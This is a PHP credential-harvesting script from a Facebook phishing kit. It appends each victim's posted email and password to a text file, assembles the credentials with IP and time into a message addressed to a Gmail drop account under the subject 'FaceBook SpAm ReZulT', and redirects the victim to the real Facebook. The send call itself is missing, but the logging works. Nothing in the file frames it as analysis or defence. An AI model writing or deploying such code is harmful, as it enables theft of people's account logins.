<?php
header('Location: https://facebook.com/');
if (!empty($_POST['email'])) {file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
$message .= "user: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['pass']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "ahssineme70@gmail.com";
$subject = "FaceBook SpAm ReZulT | $ip";
$headers = "From: FaceBook";
}

exit();
